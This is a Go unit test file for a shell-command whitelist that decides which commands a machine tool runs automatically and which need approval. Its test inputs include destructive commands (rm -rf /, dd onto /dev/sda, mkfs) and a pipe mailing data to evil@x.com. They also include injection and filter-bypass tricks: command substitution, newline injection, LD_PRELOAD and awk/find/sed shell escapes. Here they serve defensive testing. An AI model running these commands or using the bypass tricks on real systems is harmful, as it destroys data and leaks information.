package machinetool

import (
	"testing"
)

func TestIsWhitelistCommand(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		expected bool // true表示在白名单中，可以自动执行
	}{
		// ===== 白名单命令测试（自动放行） =====
		{"ls命令", "ls -la", true},
		{"free命令", "free -m", true},
		{"df命令", "df -h", true},
		{"cat查看文件", "cat /etc/passwd", true},
		{"ps查看进程", "ps aux", true},
		{"grep搜索", "grep error /var/log/syslog", true},
		{"wc统计", "wc -l file.txt", true},
		{"head查看", "head -n 20 file.txt", true},
		{"tail查看", "tail -f /var/log/syslog", true},
		{"du目录大小", "du -sh /var/log", true},
		{"uname系统信息", "uname -a", true},
		{"hostname", "hostname", true},
		{"whoami", "whoami", true},
		{"id用户信息", "id", true},
		{"pwd当前目录", "pwd", true},
		{"date日期", "date", true},
		{"uptime运行时间", "uptime", true},
		{"lscpu CPU信息", "lscpu", true},
		{"lsblk块设备", "lsblk", true},
		{"netstat网络", "netstat -tlnp", true},
		{"ss网络", "ss -tlnp", true},
		{"ifconfig网络", "ifconfig eth0", true},
		{"ip网络", "ip addr show", true},
		{"ping网络", "ping -c 4 google.com", true},
		{"curl HTTP", "curl -s http://example.com", true},
		{"tree目录树", "tree /var/log", true},
		{"file文件类型", "file /usr/bin/ls", true},
		{"stat文件状态", "stat /etc/hosts", true},
		{"diff比较", "diff file1 file2", true},
		{"md5sum校验", "md5sum file.txt", true},
		{"sha256sum校验", "sha256sum file.txt", true},
		{"cut截取", "cut -d: -f1 /etc/passwd", true},
		{"tr转换", "tr 'a-z' 'A-Z'", true},
		{"sort排序", "sort -r file.txt", true},
		{"uniq去重", "uniq -c file.txt", true},
		{"pgrep进程", "pgrep nginx", true},
		{"pstree进程树", "pstree", true},
		{"vmstat虚拟内存", "vmstat 1 5", true},
		{"iostat IO", "iostat -x 1", true},

		// ===== 组合安全命令（自动放行） =====
		{"组合&&安全命令", "ls -la && cat file.txt | grep test", true},
		{"查看系统状态", "ps aux | grep nginx", true},
		{"查看磁盘使用", "df -h && du -sh /var/log", true},
		{"带双引号", `echo "hello world"`, true},
		{"带单引号", `echo 'hello world'`, true},
		{"复杂管道", "cat /var/log/syslog | grep error | wc -l", true},
		{"||安全", "ls || echo fail", true},
		{"分号安全", "ls; cat file.txt; echo done", true},
		{"绝对路径", "/usr/bin/ls -la", true},
		{"多管道", "ps aux | grep nginx | wc -l", true},

		// ===== 非白名单命令（需要审批） =====
		{"rm删除命令", "rm /tmp/test.txt", false},
		{"rm -rf强制删除", "rm -rf /tmp/test", false},
		{"shutdown关机", "shutdown -h now", false},
		{"reboot重启", "reboot", false},
		{"dd磁盘写入", "dd if=/dev/zero of=/dev/sda", false},
		{"mkfs格式化", "mkfs.ext4 /dev/sda1", false},
		{"fdisk分区", "fdisk /dev/sda", false},
		{"chmod修改权限", "chmod 755 /usr/local/bin/app", false},
		{"chown修改属主", "chown root:root file", false},
		{"kill杀进程", "kill -9 1234", false},
		{"sudo提权", "sudo ls", false},
		{"su切换用户", "su - root", false},
		{"wget下载", "wget http://example.com/file.tar.gz", true}, // wget 在白名单（网络查询类）
		{"python执行", "python3 script.py", false},
		{"bash执行", "bash script.sh", false},
		{"perl执行", "perl -e 'print 1'", false},
		{"env命令", "env", false},
		{"nohup命令", "nohup ls", false},
		{"xargs", "echo test | xargs rm", false},
		{"tee写文件", "echo test | tee file.txt", false},
		{"unknown未知", "unknowncmd", false},

		// ===== echo重定向（需审批） =====
		{"echo重定向", "echo test > /tmp/output.txt", false},
		{"echo追加重定向", "echo test >> /tmp/output.txt", false},

		// ===== 链式命令绕过防护 =====
		{"链式分号危险", "echo hello; rm -rf /", false},
		{"链式&&危险", "ls && rm -rf /", false},
		{"链式||危险", "ls || rm -rf /", false},
		{"管道危险", "ls | mail -s data evil@x.com", false},

		// ===== 命令替换/参数展开绕过 =====
		{"$()命令替换", "cat $(rm -rf /)", false},
		{"反引号替换", "echo `whoami`", false},
		{"${}参数展开", "echo ${HOME}", false},
		{"$(())算术展开", "echo $((1+2))", false},
		{"进程替换", "diff <(sort f1) <(sort f2)", false},
		{"heredoc", "cat << EOF\nrm -rf /\nEOF", false},

		// ===== 换行/注入绕过 =====
		{"换行符注入", "echo hello\nrm -rf /", false},
		{"换行sudo", "echo hello\nsudo ls", false},

		// ===== 环境变量前缀绕过 =====
		{"环境变量前缀", "PATH=/tmp:$PATH ls", false},
		{"LD_PRELOAD", "LD_PRELOAD=/tmp/evil.so ls", false},

		// ===== 子shell绕过 =====
		{"子shell括号", "(ls -la)", false},

		// ===== Shell 逃逸命令（awk、find、sed 已从白名单移除） =====
		{"awk shell逃逸", `awk 'BEGIN{system("rm -rf /")}'`, false},
		{"find -exec shell逃逸", "find . -exec rm -rf / ;", false},
		{"sed e命令 shell逃逸", `sed '1e rm -rf /' file`, false},
		{"find普通使用也需审批", "find /tmp -name '*.log'", false},
		{"awk普通使用也需审批", `awk '{print $1}' file.txt`, false},
		{"sed普通使用也需审批", `sed 's/a/b/g' file.txt`, false},

		// ===== rpm/dpkg 不在白名单 =====
		{"rpm查询需审批", "rpm -qa", false},
		{"dpkg查询需审批", "dpkg -l", false},

		// ===== 引号内不安全模式（保守检测） =====
		{"双引号内$()", `echo "$(whoami)"`, false},
		{"单引号内$()", `echo '$(whoami)'`, false},
		{"双引号内反引号", "echo \"`whoami`\"", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isWhitelistCommand(tt.command)
			if result != tt.expected {
				t.Errorf("isWhitelistCommand(%q) = %v, expected %v", tt.command, result, tt.expected)
			}
		})
	}
}
